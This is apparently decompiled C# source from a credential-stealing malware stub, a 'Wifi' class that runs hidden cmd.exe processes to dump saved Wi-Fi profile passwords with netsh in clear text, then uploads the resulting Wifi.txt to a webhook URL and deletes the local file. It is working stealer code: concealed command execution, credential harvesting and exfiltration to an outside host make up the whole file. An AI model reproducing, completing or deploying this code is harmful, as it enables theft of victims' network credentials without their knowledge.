using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;

namespace Stub
{
	// Token: 0x02000027 RID: 39
	public static class Wifi
	{
		// Token: 0x06000072 RID: 114 RVA: 0x000068BC File Offset: 0x00004ABC
		public static string[] GetProfiles()
		{
			string text = Wifi.CommandHelper.Run("/C chcp 65001 && netsh wlan show profile | findstr All", true);
			string[] array = text.Split(new char[]
			{
				'\r',
				'\n'
			}, StringSplitOptions.RemoveEmptyEntries);
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = array[i].Substring(array[i].LastIndexOf(':') + 1).Trim();
			}
			return array;
		}

		// Token: 0x06000073 RID: 115 RVA: 0x0000691C File Offset: 0x00004B1C
		public static string GetWifiPassword(string profile)
		{
			string text = Wifi.CommandHelper.Run("/C chcp 65001 && netsh wlan show profile name=" + profile + " key=clear | findstr Key", true);
			return text.Split(new char[]
			{
				':'
			}).Last<string>().Trim();
		}

		// Token: 0x06000074 RID: 116 RVA: 0x00002880 File Offset: 0x00000A80
		public static void ScanningNetworks()
		{
			string exploitDir = Wifi.Handler.ExploitDir;
			Wifi.CommandHelper.Run("/C chcp 65001 && netsh wlan show networks mode=bssid", true);
		}

		// Token: 0x06000075 RID: 117 RVA: 0x00006960 File Offset: 0x00004B60
		public static void SavedNetworks()
		{
			string exploitDir = Wifi.Handler.ExploitDir;
			string[] profiles = Wifi.GetProfiles();
			foreach (string text in profiles)
			{
				if (!text.Equals("65001"))
				{
					string wifiPassword = Wifi.GetWifiPassword(text);
					string.Concat(new string[]
					{
						"PROFILE: ",
						text,
						"\nPASSWORD: ",
						wifiPassword,
						"\n\n"
					});
				}
			}
		}

		// Token: 0x06000076 RID: 118 RVA: 0x000069DC File Offset: 0x00004BDC
		public static void SendWifi()
		{
			string path = Program.tempFolder + "\\Wifi.txt";
			using (HttpClient httpClient = new HttpClient())
			{
				MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
				byte[] array = File.ReadAllBytes(path);
				multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), "Document", "Wifi.txt");
				httpClient.PostAsync(Program.WebhookURL, multipartFormDataContent).Wait();
				httpClient.Dispose();
				File.Delete(Program.tempFolder + "\\Wifi.txt");
			}
		}

		// Token: 0x02000028 RID: 40
		public static class Handler
		{
			// Token: 0x0400009C RID: 156
			public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

			// Token: 0x0400009D RID: 157
			public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

			// Token: 0x0400009E RID: 158
			public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System);

			// Token: 0x0400009F RID: 159
			public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

			// Token: 0x040000A0 RID: 160
			public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

			// Token: 0x040000A1 RID: 161
			public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

			// Token: 0x040000A2 RID: 162
			public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

			// Token: 0x040000A3 RID: 163
			public static readonly string ExploitName = Assembly.GetExecutingAssembly().Location;

			// Token: 0x040000A4 RID: 164
			public static readonly string ExploitDirectory = Path.GetDirectoryName(Wifi.Handler.ExploitName);

			// Token: 0x040000A5 RID: 165
			public static string[] SysPatch = new string[]
			{
				Wifi.Handler.AppData,
				Wifi.Handler.LocalData,
				Wifi.Handler.CommonData
			};

			// Token: 0x040000A6 RID: 166
			public static string zxczxczxc = Wifi.Handler.SysPatch[new Random().Next(0, Wifi.Handler.SysPatch.Length)];

			// Token: 0x040000A7 RID: 167
			public static string ExploitDir = Wifi.Handler.zxczxczxc + "\\AIO";

			// Token: 0x040000A8 RID: 168
			public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm");

			// Token: 0x040000A9 RID: 169
			public static string dateLog = DateTime.Now.ToString("MM/dd/yyyy");
		}

		// Token: 0x02000029 RID: 41
		internal sealed class CommandHelper
		{
			// Token: 0x06000078 RID: 120 RVA: 0x00006B74 File Offset: 0x00004D74
			public static string Run(string cmd, bool wait = true)
			{
				string result = "";
				using (Process process = new Process())
				{
					process.StartInfo = new ProcessStartInfo
					{
						UseShellExecute = false,
						CreateNoWindow = true,
						WindowStyle = ProcessWindowStyle.Hidden,
						FileName = "cmd.exe",
						Arguments = cmd,
						RedirectStandardError = true,
						RedirectStandardOutput = true
					};
					process.Start();
					result = process.StandardOutput.ReadToEnd();
					if (wait)
					{
						process.WaitForExit();
					}
				}
				return result;
			}
		}
	}
}
